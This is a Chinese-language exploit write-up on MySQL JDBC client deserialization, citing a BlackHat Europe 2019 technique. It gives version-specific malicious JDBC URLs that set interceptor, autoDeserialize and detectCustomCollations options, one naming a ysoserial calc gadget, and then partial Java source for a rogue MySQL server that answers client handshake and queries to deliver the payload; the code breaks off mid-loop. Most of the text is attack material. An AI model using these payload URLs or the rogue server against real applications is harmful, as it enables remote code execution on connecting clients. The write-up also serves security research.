MySQL-JDBC反序列化
漏洞原理
参考文章：
eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack
小白看得懂的MySQL JDBC 反序列化漏洞分析
MySQL JDBC 客户端反序列化漏洞分析
MySQL JDBC反序列化漏洞
上面这个是BlackHat Europe 2019议题中的利用链，在连接数据库的过程中可以触发漏洞。连接
的条件： jdbc:mysql://attacker/db? 
queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 
&autoDeserialize=true 需要设置这个 queryInterceptors 属性。
ServerStatusDiffInterceptor 是一个拦截器，在 JDBC URL 中设定属性 queryInterceptors
为 ServerStatusDiffInterceptor 时，执行查询语句会调用拦截器的 preProcess 和
postProcess 方法，进而通过上述调用链最终调用 getObject() 方法。
payload
payload 有两种触发方式， SHOW SESSION STATUS 和 SHOW COLLATION ，然后不同的 mysql-
connector-java 版本之间 payload 存在区别。
ServerStatusDiffInterceptor触发：
8.x
jdbc:mysql://127.0.0.1:3306/mysql?
serverTimezone=UTC&characterEncoding=utf8&useSSL=false&queryInterceptors=com.my
sql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"    参
数名称： queryInterceptors
6.x
jdbc:mysql://127.0.0.1:3306/mysql?
serverTimezone=UTC&characterEncoding=utf8&useSSL=false&statementInterceptors=co
m.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"    
参数名称： statementInterceptors
>=5.1.11
jdbc:mysql://127.0.0.1:3306/mysql?
serverTimezone=UTC&characterEncoding=utf8&useSSL=false&statementInterceptors=co
m.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true"   参
数名称： statementInterceptors
=5.1.0
网上的文章都说：同上，但是需要连接后执行查询。但是我从连接流量当中并没有发现请求了
SHOW SESSION STATUS 语句。但是发现他自动请求了 SHOW COLLATION 语句，不过没有用到反序
列化。
5.0.*
没有payload
detectCustomCollations触发：
>=5.1.41
无payload
5.1.29-5.1.40
jdbc:mysql://127.0.0.1:3306/test?
detectCustomCollations=true&autoDeserialize=true
5.1.28-5.1.19
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc
 hashmap = new HashMap();
    public static void main(String[] args) throws IOException, 
ClassNotFoundException {
        Server server = new Server();
        server.GreetingServer(3310);
    }
    public Server() {
        init();
    }
    public void init() {
        hashmap.put(1, "set names");
        hashmap.put(2, "set character_set_results");
        hashmap.put(3, "show warnings");
        hashmap.put(4, "session.auto_increment_increment");
        hashmap.put(5, "show session status");
        hashmap.put(6, "set autocommit");
        hashmap.put(7, "set sql_mode");
    }
    public void GreetingServer(int port) throws IOException {
        serverSocket = new ServerSocket(port);
        //serverSocket.setSoTimeout(10000000);
        while (true) {
            Socket socket = serverSocket.accept();
            System.out.println("收到来自：" + socket.getRemoteSocketAddress() + "的
请求");
            sendData("greating", socket);
            System.out.println("发送问候包");
            receiveData(socket);
            sendData("ok", socket);
            receiveData(socket);
            sendData("ok", socket);
            while (true) {
                String content = receiveData(socket);
                //System.out.println(content);
                if (content.contains(hashmap.get(1))) {
                    sendData("ok", socket);
                } else if (content.contains(hashmap.get(2))) {
                    sendData("ok", socket);